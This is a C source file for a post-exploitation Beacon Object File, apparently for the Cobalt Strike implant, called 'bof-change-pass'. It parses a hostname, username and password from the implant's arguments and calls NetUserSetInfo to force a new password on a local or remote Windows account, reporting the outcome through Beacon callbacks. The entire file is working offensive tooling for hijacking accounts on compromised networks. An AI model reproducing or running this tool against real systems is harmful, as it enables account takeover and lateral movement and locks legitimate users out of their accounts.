#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(
    UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte,
    LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserSetInfo(
    LPCWSTR servername, LPCWSTR username, DWORD level, LPBYTE buf, LPDWORD parm_err);

static WCHAR *ansi_to_wide(const char *text) {
    int len = 0;
    WCHAR *out = NULL;

    if (!text) {
        return NULL;
    }

    len = KERNEL32$MultiByteToWideChar(CP_ACP, 0, text, -1, NULL, 0);
    if (len <= 0) {
        return NULL;
    }

    out = (WCHAR *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY,
                                      (SIZE_T)len * sizeof(WCHAR));
    if (!out) {
        return NULL;
    }

    if (!KERNEL32$MultiByteToWideChar(CP_ACP, 0, text, -1, out, len)) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out);
        return NULL;
    }

    return out;
}

static void free_wide(WCHAR **value) {
    if (value && *value) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, *value);
        *value = NULL;
    }
}

static int split_args(char *line, char **argv, int max_args) {
    int count = 0;
    char *cursor = line;
    char *token = NULL;

    while (count < max_args && cursor && *cursor) {
        while (*cursor == ' ' || *cursor == '\t' || *cursor == '\r' || *cursor == '\n') {
            cursor++;
        }
        if (!*cursor) {
            break;
        }
        token = cursor;
        while (*cursor && *cursor != ' ' && *cursor != '\t' && *cursor != '\r' && *cursor != '\n') {
            cursor++;
        }
        if (*cursor) {
            *cursor++ = '\0';
        }
        argv[count++] = token;
    }

    return count;
}

static BOOL set_user_pass(LPCWSTR server, LPCWSTR username, LPCWSTR password) {
    USER_INFO_1003 newpass = {0};
    DWORD parm_err = 0;
    NET_API_STATUS ret = NERR_Success;

    newpass.usri1003_password = (LPWSTR)password;
    ret = NETAPI32$NetUserSetInfo(server, username, 1003, (LPBYTE)&newpass, &parm_err);
    if (ret != NERR_Success) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NetUserSetInfo failed: %lu (parm_err=%lu)\n",
                     (unsigned long)ret, (unsigned long)parm_err);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Success\n");
    return TRUE;
}

void go(char *args, int len) {
    datap parser = {0};
    char *packed = NULL;
    char *line = NULL;
    char *argv[3] = {0};
    WCHAR *server = NULL;
    WCHAR *username = NULL;
    WCHAR *password = NULL;
    int argc = 0;
    int packed_len = 0;

    if (len <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Usage: bof-change-pass --- <hostname> <username> <password>\n");
        return;
    }

    BeaconDataParse(&parser, args, len);
    packed = BeaconDataExtract(&parser, &packed_len);
    if (!packed || packed_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Usage: bof-change-pass --- <hostname> <username> <password>\n");
        return;
    }

    line = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY,
                                        (SIZE_T)packed_len + 1);
    if (!line) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
        return;
    }

    for (int i = 0; i < packed_len; i++) {
        line[i] = packed[i];
    }

    argc = split_args(line, argv, 3);
    if (argc < 3) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Usage: bof-change-pass --- <hostname> <username> <password>\n");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
        return;
    }

    username = ansi_to_wide(argv[1]);
    password = ansi_to_wide(argv[2]);
    if (!username || !password) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert arguments\n");
        free_wide(&username);
        free_wide(&password);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
        return;
    }

    if (argv[0][0] == '.' && argv[0][1] == '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting password: localhost\\%s\n", argv[1]);
        set_user_pass(NULL, username, password);
    } else if (argv[0][0] == '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting password: localhost\\%s\n", argv[1]);
        set_user_pass(NULL, username, password);
    } else {
        server = ansi_to_wide(argv[0]);
        if (!server) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert hostname\n");
            free_wide(&username);
            free_wide(&password);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting password: %s\\%s\n", argv[0], argv[1]);
        set_user_pass(server, username, password);
    }

    free_wide(&server);
    free_wide(&username);
    free_wide(&password);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
}
